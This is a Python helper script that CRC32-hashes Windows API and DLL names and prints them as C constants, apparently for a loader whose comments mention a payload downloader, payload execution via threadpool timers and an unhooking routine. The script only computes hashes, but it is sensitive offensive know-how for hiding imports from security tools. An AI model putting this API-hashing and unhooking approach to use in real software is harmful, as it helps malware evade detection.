CRC_POLYNOMIAL = 0xEDB88320
STR = "_CRC32"

g_StringsArray = [
    # Used in downloader functions
    "WinHttpOpen",
    "WinHttpConnect",
    "WinHttpOpenRequest",
    "WinHttpSendRequest",
    "WinHttpReceiveResponse",
    "WinHttpReadData",
    "WinHttpCloseHandle",
    "GetTickCount64",

    # msvcrt
    "memset",
    "_time64",
    "printf",
    "rand",
    "sprintf",
    "srand",
    "memcpy",
    "memcmp",
    "strlen",
    "realloc",
    "malloc",
    "wcscat",
    "wcslen",

    # Used in GetProcAddressH
    "LoadLibraryA",

    # Used for payload execution
    "CreateThreadpoolTimer",
    "SetThreadpoolTimer",
    "WaitForSingleObject",

    # Used in the unhooking routine
    "AddVectoredExceptionHandler",
    "RemoveVectoredExceptionHandler",

    None
]

def CRC32B(cString):
    uMask = 0x00
    uHash = 0xFFFFFFFF
    i = 0x00

    while i < len(cString):
        uHash = uHash ^ ord(cString[i])

        for ii in range(8):
            uMask = -1 * (uHash & 1)
            uHash = (uHash >> 1) ^ (CRC_POLYNOMIAL & uMask)

        i += 1

    return ~uHash & 0xFFFFFFFF

def CRCHASH(STR):
    return CRC32B(STR)

def main():
    i = 0
    while g_StringsArray[i] is not None:
        print(f"#define {g_StringsArray[i]}{STR} \t 0x{CRCHASH(g_StringsArray[i]):08X}")
        i += 1

    print(f"\n#define {'text'}{STR} \t 0x{CRCHASH('.text'):08X}")
    print(f"\n#define {'kernel32'}{STR} \t 0x{CRCHASH('kernel32.dll'):08X}")
    print(f"\n#define {'winhttp'}{STR} \t 0x{CRCHASH('winhttp.dll'):08X}")
    print(f"\n#define {'ntdll'}{STR} \t 0x{CRCHASH('ntdll.dll'):08X}")
    print(f"\n#define {'msvcrt'}{STR} \t 0x{CRCHASH('msvcrt.dll'):08X}")

if __name__ == "__main__":
    main()
